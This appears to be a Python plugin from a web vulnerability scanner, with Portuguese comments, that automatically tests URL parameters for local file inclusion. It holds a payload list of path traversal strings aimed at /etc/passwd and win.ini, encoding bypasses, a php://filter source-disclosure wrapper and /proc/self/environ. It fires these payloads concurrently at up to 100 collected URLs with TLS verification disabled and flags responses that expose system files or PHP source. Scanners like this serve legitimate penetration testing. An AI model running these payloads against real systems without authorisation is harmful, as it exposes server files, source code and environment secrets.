import json
import logging
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.parse
from menu import C
from plugins.output import info, error, success, warn
from plugins.http_utils import format_http_request, format_http_response

logging.getLogger("httpx").setLevel(logging.WARNING)

LFI_PAYLOADS = [
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../windows/win.ini",
    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    # V11: Payloads adicionais de bypass
    "....//....//....//....//....//etc/passwd",
    "..%252f..%252f..%252f..%252fetc/passwd",
    "/proc/self/environ",
]

LFI_INDICATORS = [
    "root:x:0:0:",
    "[extensions]",
    "for 16-bit app support",
]

def scan_lfi(url: str) -> list[dict]:
    """Thread-safe: cada thread cria seu próprio httpx.Client."""
    import httpx
    from core.config import get_user_agent

    findings = []
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qsl(parsed.query)
        if not params:
            return findings

        with httpx.Client(verify=False, timeout=10) as client:
            ua = get_user_agent()

            # V10.6: Baseline check
            baseline_indicators = set()
            baseline_has_b64 = False
            try:
                baseline_resp = client.get(url, headers={"User-Agent": ua}, timeout=10)
                baseline_body = baseline_resp.text.lower()
                for ind in LFI_INDICATORS:
                    if ind in baseline_body:
                        baseline_indicators.add(ind)
                if "pd9wa" in baseline_body:
                    baseline_has_b64 = True
            except Exception:
                pass

            for key, value in params:
                for payload in LFI_PAYLOADS:
                    test_params = []
                    for k, v in params:
                        if k == key:
                            test_params.append((k, payload))
                        else:
                            test_params.append((k, v))

                    test_query = urllib.parse.urlencode(test_params)
                    test_url = parsed._replace(query=test_query).geturl()

                    try:
                        resp = client.get(test_url, headers={"User-Agent": ua}, timeout=10)
                        body = resp.text.lower()
                        for ind in LFI_INDICATORS:
                            # V10.6: Only flag if indicator was NOT in baseline
                            if ind in body and ind not in baseline_indicators:
                                findings.append({
                                    "url": test_url,
                                    "type": "LOCAL_FILE_INCLUSION",
                                    "risk": "HIGH",
                                    "details": f"LFI Confirmado via {key} (Indicador: {ind})",
                                    "payload": payload,
                                    "request_raw": format_http_request(resp.request),
                                    "response_raw": format_http_response(resp),
                                })
                                break
                        # V11: Decodificar base64 para verificar se contém PHP real
                        if "pd9wa" in body and not baseline_has_b64:
                            import base64, re
                            b64_match = re.search(r'[A-Za-z0-9+/]{40,}={0,2}', resp.text)
                            is_real_php = False
                            if b64_match:
                                try:
                                    decoded = base64.b64decode(b64_match.group()).decode(errors='ignore')
                                    if '<?php' in decoded or '<?=' in decoded or '<?PHP' in decoded:
                                        is_real_php = True
                                except Exception:
                                    pass
                            if is_real_php:
                                findings.append({
                                    "url": test_url,
                                    "type": "LOCAL_FILE_INCLUSION",
                                    "risk": "HIGH",
                                    "details": f"LFI Filter Bypass Confirmado (PHP Wrappers, código PHP decodificado) via {key}",
                                    "payload": payload,
                                    "request_raw": format_http_request(resp.request),
                                    "response_raw": format_http_response(resp),
                                })
                    except Exception:
                        pass
    except Exception:
        pass
    return findings

def run(context: dict) -> list[str]:
    target = context.get("target")
    if not target:
        raise ValueError("Target required")
    print(f"\n{C.BOLD}{C.CYAN}▰▰▰ TESTANDO INCLUSÃO DE ARQUIVOS (LFI) ▰▰▰{C.END}\n")

    outdir = Path("output") / target / "lfi"
    outdir.mkdir(parents=True, exist_ok=True)
    results_file = outdir / "lfi_results.json"

    try:
        import httpx
    except ImportError:
        error("httpx não encontrado")
        return []

    all_findings = []
    urls_file = Path("output") / target / "urls" / "patterns" / "lfi_ready.txt"
    if not urls_file.exists():
        urls_file = Path("output") / target / "urls" / "urls_200.txt"
        if not urls_file.exists():
            warn("Nenhuma URL com parâmetros encontrada para teste de LFI.")
            return [str(results_file)]

    urls = list(set([u.strip() for u in urls_file.read_text().splitlines() if u.strip()]))
    info(f"   📊 Testando {len(urls)} URLs para LFI...")

    # V11: Thread-safe — cada thread cria seu próprio client
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {executor.submit(scan_lfi, url): url for url in urls[:100]}
        for future in as_completed(futures):
            try:
                result = future.result()
                if result:
                    all_findings.extend(result)
                    for f in result:
                        info(f"   🚨 {C.RED}LFI Encontrado: {f['url']}{C.END}")
            except Exception:
                pass

    results_file.write_text(json.dumps(all_findings, indent=2, ensure_ascii=False))
    if all_findings:
        success(f"📂 {len(all_findings)} potenciais vulnerabilidades de LFI encontradas!")
    else:
        success("✅ Nenhuma vulnerabilidade LFI detectada.")

    return [str(results_file)]
